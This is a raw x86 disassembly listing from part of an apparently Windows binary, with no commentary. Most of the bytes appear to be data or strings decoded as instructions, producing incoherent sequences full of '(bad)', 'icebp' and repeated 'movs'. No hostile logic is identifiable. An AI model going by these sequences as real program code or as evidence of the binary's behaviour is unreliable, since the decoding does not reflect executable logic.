  422457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422458:	fwait
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422462:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	shl    DWORD PTR [edx],cl
  42246c:	shr    DWORD PTR [ecx+esi*8],1
  42246f:	or     al,0xf7
  422471:	push   cs
  422472:	pop    ss
  422473:	outs   dx,BYTE PTR ds:[esi]
  422474:	adc    eax,0x3a49168
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	fwait
  42247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422484:	xor    eax,0x9ba48da4
  422489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422492:	imul   DWORD PTR [esi+0x17]
  422495:	dec    esi
  422496:	adc    eax,0x37a49148
  42249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249c:	fwait
  42249d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249e:	jae    0x422444
  4224a0:	popf   
  4224a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a2:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	fwait
  4224ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ac:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  4224b4:	test   DWORD PTR [esi+0x16],0x91a814ae
  4224bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224bc:	aaa    
  4224bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224be:	fwait
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	jae    0x422466
  4224c2:	popf   
  4224c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c4:	pop    ss
  4224c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c6:	xchg   ebp,eax
  4224c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c8:	push   ecx
  4224c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ca:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  4224d1:	inc    edx
  4224d2:	ror    DWORD PTR [eax+esi*8-0x54],1
  4224d6:	imul   BYTE PTR [esi-0x77eb71ea]
  4224dc:	xchg   ecx,eax
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	aaa    
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	fwait
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	jae    0x422488
  4224e4:	popf   
  4224e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e6:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  4224ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ee:	fwait
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224f7:	mov    esi,?
  4224f9:	mov    ss,WORD PTR [esi]
  4224fb:	out    dx,al
  4224fc:	adc    al,0xe8
  4224fe:	xchg   ecx,eax
  4224ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422500:	aaa    
  422501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422502:	fwait
  422503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422504:	jae    0x4224aa
  422506:	popf   
  422507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422508:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  42250f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422510:	fwait
  422511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422512:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42251a:	imul   dh
  42251c:	push   ss
  42251d:	into   
  42251e:	adc    al,0xc8
  422520:	xchg   ecx,eax
  422521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422522:	cmp    eax,0x51a49ba4
  422527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422528:	popf   
  422529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252a:	jnp    0x4224d0
  42252c:	xchg   ebx,eax
  42252d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252e:	fwait
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	xchg   ecx,eax
  422531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422532:	shl    dl,cl
  422534:	shr    ah,1
  422536:	lock int3 
  422538:	test   dh,0x16
  42253b:	cs adc al,0x28
  42253e:	push   ss
  42253f:	push   cs
  422540:	adc    al,0x8
  422542:	xchg   ebx,eax
  422543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422544:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42254b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42254c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422554:	fwait
  422555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422556:	lea    esp,[edx+edx*8-0xfd32fde]
  42255d:	or     al,0xf6
  42255f:	push   cs
  422560:	push   ss
  422561:	outs   dx,BYTE PTR ds:[esi]
  422562:	adc    al,0x68
  422564:	xchg   ecx,eax
  422565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422566:	add    BYTE PTR [eax],al
  422568:	lock and eax,DWORD PTR [edx+0x0]
  42256c:	cld    
  42256d:	and    eax,0x26040042
  422572:	inc    edx
  422573:	add    BYTE PTR [edi+eiz*1+0x23e80042],cl
  42257a:	inc    edx
  42257b:	add    BYTE PTR [eax],cl
  42257d:	es inc edx
  42257f:	add    BYTE PTR [edx+0x7c],ch
  422582:	inc    edx
  422583:	add    dl,ah
  422585:	jle    0x4225c9
  422587:	add    al,bh
  422589:	es inc edx
  42258b:	add    BYTE PTR [edi+eiz*1+0x42],bh
  42258f:	add    ah,ah
  422591:	and    eax,0x25e80042
  422596:	inc    edx
  422597:	add    BYTE PTR [eax+0x27],bh
  42259a:	inc    edx
  42259b:	add    BYTE PTR [esi+eiz*1+0x42],cl
  42259f:	add    BYTE PTR [edx-0x35],cl
  4225a2:	push   es
  4225a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a4:	scas   al,BYTE PTR es:[edi]
  4225a5:	or     al,0x6
  4225a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a8:	add    BYTE PTR [esi],ah
  4225aa:	inc    edx
  4225ab:	add    BYTE PTR [eax-0x3bffbdda],dh
  4225b1:	es inc edx
  4225b3:	add    al,dl
  4225b5:	es inc edx
  4225b7:	add    al,ah
  4225b9:	es inc edx
  4225bb:	add    BYTE PTR [eax],bh
  4225bd:	es inc edx
  4225bf:	add    ah,ch
  4225c1:	and    eax,DWORD PTR [edx+0x0]
  4225c4:	pop    eax
  4225c5:	es inc edx
  4225c7:	add    BYTE PTR [eax+0x26],cl
  4225ca:	inc    edx
  4225cb:	add    BYTE PTR [eax-0x51ffbdd9],dl
  4225d1:	call   0xbde7:0x4338a406
  4225d8:	push   0x70004226
  4225dd:	es inc edx
  4225df:	add    BYTE PTR [esi+eiz*1],cl
  4225e2:	inc    edx
  4225e3:	add    BYTE PTR [edi+eax*4],ah
  4225e6:	loopne 0x4225a5
  4225e8:	jbe    0x422665
  4225ea:	pop    ds
  4225eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225ec:	add    BYTE PTR [eax],al
  4225ee:	inc    eax
  4225ef:	add    dl,ch
  4225f1:	rcl    dl,cl
  4225f3:	pop    ecx
  4225f4:	fistp  QWORD PTR [esi+0x42]
  4225f7:	add    bl,bl
  4225f9:	outs   dx,DWORD PTR fs:[esi]
  4225fb:	arpl   WORD PTR [edi+0xf],si
  4225fe:	pop    ebx
  4225ff:	xor    DWORD PTR [esi-0x5],esi
  422602:	(bad)  
  422603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422604:	mov    dl,0xc
  422606:	xchg   ebx,eax
  422607:	test   al,0xf4
  422609:	and    eax,0xdaaa0042
  42260e:	push   es
  42260f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422610:	stos   BYTE PTR es:[edi],al
  422611:	fiadd  WORD PTR [esi]
  422613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422615:	fiadd  DWORD PTR [esi]
  422617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422618:	mov    ds:0xbea406da,al
  42261d:	fiadd  DWORD PTR [esi]
  42261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422620:	mov    edx,0xb6a406da
  422625:	fiadd  DWORD PTR [esi]
  422627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422628:	mov    dl,0xda
  42262a:	push   es
  42262b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42262c:	mov    ds,edx
  42262e:	push   es
  42262f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422630:	mov    bl,dl
  422632:	push   es
  422633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422634:	out    dx,al
  422635:	fiadd  DWORD PTR [esi]
  422637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422638:	dec    DWORD PTR [ebx]
  42263a:	adc    edi,DWORD PTR [edx]
  42263c:	in     al,0x23
  42263e:	inc    edx
  42263f:	add    ch,dl
  422641:	sub    BYTE PTR [edx+0x0],al
  422644:	pop    ss
  422645:	loop   0x4225d0
  422647:	js     0x4225f7
  422649:	call   0xa4d7:0xcb3aa406
  422650:	and    al,0x75
  422652:	add    BYTE PTR [eax],al
  422654:	loopne 0x422679
  422656:	inc    edx
  422657:	add    BYTE PTR [edx],ah
  422659:	inc    ebx
  42265a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422668:	hlt    
  422669:	clc    
  42266a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422670:	sub    eax,DWORD PTR [edi+0x1f]
  422673:	jle    0x422675
	...
  422699:	add    BYTE PTR [eax],al
  42269b:	add    BYTE PTR [edx+0x7c],ch
  42269e:	inc    edx
	...
  4226ab:	add    cl,bh
  4226ad:	jmp    0xa48f26f3
  4226b2:	push   ecx
  4226b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b4:	jg     0x42265a
  4226b6:	inc    edi
  4226b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b8:	push   ecx
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	inc    ebx
  4226bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226bc:	std    
  4226bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226be:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  4226c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c6:	push   ebx
  4226c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c8:	dec    ecx
  4226c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ca:	std    
  4226cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226cc:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  4226d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d4:	push   ecx
  4226d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d6:	jg     0x42267c
  4226d8:	std    
  4226d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226da:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  4226e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e2:	dec    ebx
  4226e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e4:	inc    ebx
  4226e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e6:	jne    0x42268c
  4226e8:	pop    ecx
  4226e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ea:	jnp    0x422690
  4226ec:	dec    ecx
  4226ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ee:	fwait
  4226ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226f8:	xor    eax,eax
  4226fa:	xor    esp,DWORD PTR [eax]
  4226fc:	xor    eax,DWORD PTR [eax]
  4226fe:	xor    esp,DWORD PTR [eax+0x33]
  422701:	inc    eax
  422702:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  422708:	xor    al,al
  42270a:	xor    ah,BYTE PTR [eax]
  42270c:	xor    al,BYTE PTR [eax]
  42270e:	xor    ah,BYTE PTR [eax+0x32]
  422711:	inc    eax
  422712:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422718:	xor    ecx,esp
  42271a:	xor    ecx,esi
  42271c:	xor    ecx,eax
  42271e:	xor    ecx,edx
  422720:	xor    edx,esp
  422722:	xor    edx,esi
  422724:	xor    edx,eax
  422726:	xor    edx,edx
  422728:	xor    ebx,esp
  42272a:	xor    ebx,esi
  42272c:	xor    ebx,eax
  42272e:	xor    ebx,edx
  422730:	xor    eax,esi
  422732:	push   ebx
  422733:	shl    BYTE PTR [ebx-0x40],0x93
  422737:	rcl    DWORD PTR [esi-0x56],0x15
  42273b:	into   
  42273c:	xchg   ebp,eax
  42273d:	dec    ecx
  42273e:	xor    ecx,esp
  422740:	sbb    eax,0x50abaae2
  422745:	push   0x1e
  422747:	cs je  0x42275e
  42274a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422750:	imul   edi,edx,0xffffffd5
  422753:	leave  
  422754:	daa    
  422755:	dec    eax
  422756:	out    dx,eax
  422757:	pushf  
  422758:	mov    dh,0xdf
  42275a:	dec    esi
  42275b:	xchg   ebp,eax
  42275c:	lock xor DWORD PTR [esi-0x6c],ebp
  422760:	inc    ebp
  422761:	or     eax,0xc1470876
  422766:	js     0x422723
  422768:	popa   
  422769:	pop    ecx
  42276a:	jecxz  0x4227d7
  42276c:	mov    BYTE PTR [edx-0x56],0x5
  422770:	cs enter 0xaa46,0x44
  422775:	aas    
  422776:	inc    ebp
  422777:	leave  
  422778:	test   BYTE PTR [ebx+0x819a593],0xd8
  42277f:	jl     0x4227f9
  422781:	mov    es,WORD PTR [edx+0x0]
  422784:	jb     0x4227e0
  422786:	pop    ss
  422787:	sub    ebp,esp
  422789:	and    eax,0x26500042
  42278e:	inc    edx
  42278f:	add    BYTE PTR [esi-0x5],dh
  422792:	fbld   TBYTE PTR [ebp+0x0]
	...
  4227a0:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  4227a6:	popa   
  4227a7:	arpl   WORD PTR [edi+0x7a],bp
  4227aa:	popa   
  4227ab:	outs   dx,DWORD PTR ds:[si]
  4227ad:	gs ins DWORD PTR es:[edi],dx
  4227af:	jae    0x4227f3
  4227b1:	outs   dx,DWORD PTR ds:[esi]
  4227b2:	ins    BYTE PTR es:[edi],dx
  4227b3:	gs mov cl,0x65
  4227b6:	in     eax,dx
  4227b7:	jg     0x4227f2
  4227b9:	ja     0x422824
  4227bb:	jp     0x4227b0
  4227bd:	inc    esp
  4227be:	push   0x1b
  4227c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c1:	push   ecx
  4227c2:	dec    esp
  4227c3:	gs jb  0x42283f
  4227c6:	popa   
  4227c7:	push   ebx
  4227c8:	jne    0x42283b
  4227ca:	jae    0x42282d
  4227cc:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  4227d3:	inc    esp
  4227d4:	(bad)  [edx+0x65]
  4227d7:	jae    0x42282f
  4227d9:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  4227e0:	jb     0x422844
  4227e2:	gs je  0x4227b8
  4227e5:	lds    edx,FWORD PTR [eax-0x68]
  4227e8:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  4227ec:	fs jne 0x42285e
  4227ef:	push   eax
  4227f0:	gs fs jae 0x422861
  4227f4:	popa   
  4227f5:	ins    DWORD PTR es:[edi],dx
  4227f6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  422809:	add    BYTE PTR [eax],al
  42280b:	add    BYTE PTR [esp+ecx*4],ch
  42280e:	push   ss
  42280f:	mov    esi,0x6f4c8773
  422814:	jb     0x422884
  422816:	jno    0x422881
  422818:	or     al,0x36
  42281a:	lods   al,BYTE PTR ds:[esi]
  42281b:	repnz push edx
  42281d:	je     0x42288e
  42281f:	je     0x422865
  422821:	js     0x4227df
  422823:	cmc    
  422824:	outs   dx,DWORD PTR ds:[esi]
  422825:	ins    DWORD PTR es:[edi],dx
  422826:	popa   
  422827:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42282e:	popa   
  42282f:	jb     0x4228a6
  422831:	push   0x68736f79
  422836:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42283d:	mov    ch,0xa5
  42283f:	jns    0x4228b4
  422841:	outs   dx,DWORD PTR ds:[esi]
  422842:	addr16 popa 
  422844:	add    BYTE PTR [bp+si],bh
  422847:	sub    bh,cl
  422849:	icebp  
  42284a:	gs ins BYTE PTR es:[edi],dx
  42284c:	jae    0x422896
  42284e:	popa   
  42284f:	je     0x4228b9
  422851:	ins    DWORD PTR es:[edi],dx
  422852:	add    BYTE PTR gs:[bx+si],al
  422856:	in     al,dx
  422857:	mov    ecx,0x414ad1d2
  42285c:	ins    DWORD PTR es:[edi],dx
  42285d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422864:	gs ins DWORD PTR es:[edi],dx
  422866:	add    BYTE PTR [eax],al
  422868:	jne    0x42287a
  42286a:	popa   
  42286b:	or     BYTE PTR [esi+0x73654dbb],al
  422871:	popa   
  422872:	push   0x78000061
  422877:	loope  0x4228bb
  422879:	stos   BYTE PTR es:[edi],al
  42287a:	je     0x4228dd
  42287c:	push   edi
  42287d:	popa   
  42287e:	jb     0x4228eb
  422880:	jae    0x4228ed
  422882:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422889:	loope  0x422857
  42288b:	aad    0x6f
  42288d:	jb     0x4228fb
  42288f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422896:	je     0x4228ab
  422898:	adc    al,BYTE PTR [ebp+0x77646172]
  42289e:	outs   dx,DWORD PTR ds:[esi]
  42289f:	gs ins DWORD PTR es:[edi],dx
  4228a1:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  4228a8:	outs   dx,BYTE PTR ds:[esi]
  4228a9:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  4228b0:	ja     0x422916
  4228b2:	outs   dx,DWORD PTR ds:[esi]
  4228b3:	popa   
  4228b4:	outs   dx,BYTE PTR ds:[esi]
  4228b5:	gs jae 0x42291a
  4228b8:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  4228bf:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  4228c7:	inc    ebx
  4228c8:	jb     0x422883
  4228ca:	sbb    al,0xd9
  4228cc:	jo     0x422937
  4228ce:	addr16 js 0x422946
  4228d1:	jo     0x422948
  4228d3:	fs add ch,cl
  4228d6:	xchg   esi,eax
  4228d7:	in     eax,dx
  4228d8:	jno    0x42294b
  4228da:	iret   
  4228db:	jbe    0x4228d6
  4228dd:	or     dh,BYTE PTR [esi-0x3]
  4228e0:	cwde   
  4228e1:	int    0xd6
  4228e3:	std    
  4228e4:	pop    ebp
  4228e5:	fsubr  DWORD PTR [edi]
  4228e7:	dec    edx
  4228e8:	xor    eax,0xd6cd860a
  4228ed:	stc    
  4228ee:	inc    ebx
  4228ef:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228f5:	dec    edx
  4228f6:	sbb    BYTE PTR [ecx+0x52],bh
  4228f9:	mov    ch,al
  4228fb:	jns    0x42294f
  4228fd:	dec    edx
  4228fe:	sbb    BYTE PTR [ecx+0x6e],bh
  422901:	xchg   edx,eax
  422902:	cmp    eax,0xcd96c5cb
  422907:	in     eax,dx
  422908:	jno    0x42297b
  42290a:	iret   
  42290b:	jbe    0x422906
  42290d:	or     dh,BYTE PTR [esi-0x3]
  422910:	int    0x96
  422912:	std    
  422913:	pop    ebp
  422914:	jns    0x422961
  422916:	pop    edx
  422917:	xor    eax,0x96cd920a
  42291c:	stc    
  42291d:	inc    ebx
  42291e:	icebp  
  42291f:	(bad)  
  422920:	das    
  422921:	int    0x76
  422923:	mov    BYTE PTR [ecx+0x6e],bh
  422926:	mov    DWORD PTR [edx-0x13749387],esi
  42292c:	jns    0x42299c
  42292e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422934:	retf   
  422935:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42293c:	jno    0x42290d
  42293e:	jbe    0x422939
  422940:	or     dh,BYTE PTR [esi-0x3]
  422943:	int    0x96
  422945:	std    
  422946:	pop    ebp
  422947:	fdiv   DWORD PTR [ebx-0x6df55465]
  42294d:	int    0x96
  42294f:	stc    
  422950:	inc    ebx
  422951:	icebp  
  422952:	(bad)  
  422953:	test   BYTE PTR [ecx+0x6e],bh
  422956:	mov    ebp,esp
  422958:	int    0x76
  42295a:	mov    BYTE PTR [ecx+0x6e],bh
  42295d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422964:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42296b:	jno    0x42293c
  42296d:	jbe    0x422968
  42296f:	or     dh,BYTE PTR [esi-0x3]
  422972:	cwde   
  422973:	int    0xd6
  422975:	std    
  422976:	pop    ebp
  422977:	ret    0x2be4
  42297a:	cmp    DWORD PTR [edx],ecx
  42297c:	xchg   ch,cl
  42297e:	(bad)  
  42297f:	stc    
  422980:	inc    ebx
  422981:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422987:	test   BYTE PTR [ebx-0x78913648],ch
  42298d:	ret    0x79ab
  422990:	xchg   edx,eax
  422991:	aad    0xcb
  422993:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422999:	iret   
  42299a:	jbe    0x422995
  42299c:	or     dh,BYTE PTR [esi-0x3]
  42299f:	int    0x96
  4229a1:	std    
  4229a2:	pop    ebp
  4229a3:	pop    ecx
  4229a4:	ins    BYTE PTR es:[edi],dx
  4229a5:	cmp    dh,BYTE PTR ds:0x96cd920a
  4229ab:	stc    
  4229ac:	inc    ebx
  4229ad:	icebp  
  4229ae:	(bad)  
  4229af:	push   ebx
  4229b0:	int    0x76
  4229b2:	mov    BYTE PTR [ecx+0x6e],bh
  4229b5:	mov    BYTE PTR [edi+0x47816c79],ah
  4229bb:	jns    0x422a2b
  4229bd:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  4229c3:	call   0xcded:0xcd965b98
  4229ca:	jbe    0x422a00
  4229cc:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  4229d3:	sbb    al,0x81
  4229d5:	(bad)  
  4229d6:	and    al,0x98
  4229d8:	int    0xd6
  4229da:	adc    al,0x47
  4229dc:	mov    ds:0xff8eca62,al
  4229e1:	add    al,0x7d
  4229e3:	add    ch,dl
  4229e5:	lods   eax,DWORD PTR ds:[esi]
  4229e6:	clc    
  4229e7:	icebp  
  4229e8:	jo     0x4229b4
  4229ea:	(bad)  
  4229ec:	jge    0x4229ee
  4229ee:	aad    0xad
  4229f0:	clc    
  4229f1:	icebp  
  4229f2:	jo     0x422986
  4229f4:	adc    ecx,ebp
  4229f6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229fd:	jo     0x422a6f
  4229ff:	jo     0x422a71
  422a01:	jo     0x42299d
  422a03:	xor    esi,edi
  422a05:	cwde   
  422a06:	add    al,0xc
  422a08:	add    BYTE PTR [ebp-0x80],bl
  422a0b:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a11:	or     DWORD PTR [eax-0x75],ebx
  422a14:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a1b:	jecxz  0x422a08
  422a1d:	hlt    
  422a1e:	scas   eax,DWORD PTR es:[edi]
  422a1f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a26:	sub    dl,0xfa
  422a29:	iret   
  422a2a:	pop    eax
  422a2b:	iret   
  422a2c:	push   0xffffffcd
  422a2e:	out    0xfd,al
  422a30:	int    0x76
  422a32:	adc    DWORD PTR [ebx],esi
  422a34:	out    0x34,al
  422a36:	sub    ecx,ecx
  422a38:	or     dh,BYTE PTR [esi-0x43]
  422a3b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a41:	sub    BYTE PTR [edi],0x6
  422a44:	sub    DWORD PTR [eax-0x72357f80],eax
  422a4a:	cmc    
  422a4b:	sub    esp,esi
  422a4d:	in     eax,dx
  422a4e:	aad    0xe9
  422a50:	add    ebx,ebp
  422a52:	mov    bh,dh
  422a54:	fcmovnbe st,st(5)
  422a56:	out    dx,eax
  422a57:	pushf  
  422a58:	xchg   edi,edi
  422a5a:	test   al,0xcf
  422a5c:	fs adc ebx,0xffffffe9
  422a60:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a64:	iret   
  422a65:	int3   
  422a66:	call   0x80c2792f
  422a6b:	jno    0x422a05
  422a6d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a77:	int    0xe6
  422a79:	std    
  422a7a:	xor    esp,esi
  422a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a7d:	das    
  422a7e:	pop    ecx
  422a7f:	push   0xffffffcd
  422a81:	(bad)  
  422a82:	or     eax,0xfcde9e3
  422a87:	sub    edi,eax
  422a89:	xchg   DWORD PTR [edi],ecx
  422a8b:	iret   
  422a8c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a92:	add    BYTE PTR [eax-0x102c8233],0x88
  422a99:	add    al,0xf2
  422a9b:	add    DWORD PTR [ebx+0x2],0x80818069
  422aa2:	adc    dh,0x4e
  422aa5:	inc    ebx
  422aa6:	jns    0x422a2a
  422aa8:	fldlg2 
  422aaa:	es int 0xc6
  422aad:	or     eax,0x809221bd
  422ab2:	add    al,0x81
  422ab5:	mov    al,ds:0xfb87d287
  422aba:	add    al,0xbd
  422abc:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422ac3:	jns    0x422a92
  422ac5:	ins    DWORD PTR es:[edi],dx
  422ac6:	and    ch,0xa0
  422ac9:	push   edx
  422aca:	add    al,0x3
  422acc:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422ad2:	push   edx
  422ad3:	add    al,0x3
  422ad5:	push   ebx
  422ad6:	mov    al,cl
  422ad8:	test   bh,bh
  422ada:	retf   
  422adb:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422ae3:	(bad)  
  422ae4:	in     al,dx
  422ae5:	outs   dx,DWORD PTR ds:[esi]
  422ae6:	rcl    bl,1
  422ae8:	(bad)  
  422ae9:	jge    0x422aa8
  422aeb:	outs   dx,DWORD PTR ds:[esi]
  422aec:	xchg   edx,eax
  422aed:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422af4:	sahf   
  422af5:	mov    al,ds:0x3454009e
  422afa:	jno    0x422b5e
  422afc:	popa   
  422afd:	mov    ah,0x86
  422aff:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422b06:	push   cs
  422b07:	(bad)  
  422b08:	jge    0x422ac7
  422b0a:	push   eax
  422b0b:	xchg   edx,eax
  422b0c:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b13:	jge    0x422ad2
  422b15:	push   ss
  422b16:	xchg   edx,eax
  422b17:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b1e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b24:	jo     0x422af3
  422b26:	(bad)  
  422b27:	std    
  422b28:	xor    edx,esi
  422b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b2b:	inc    ebx
  422b2c:	(bad)  
  422b2d:	xor    al,0x2f
  422b2f:	or     esp,ebx
  422b31:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b3b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b45:	int    0xd6
  422b47:	popf   
  422b48:	aam    0x23
  422b4a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b50:	or     ch,0xd6
  422b53:	xchg   ebp,eax
  422b54:	aam    0x89
  422b56:	int    0xd6
  422b58:	icebp  
  422b59:	int    0x8d
  422b5b:	xchg   ebp,eax
  422b5c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b62:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b68:	or     cl,BYTE PTR [ebp-0x5a29f563]
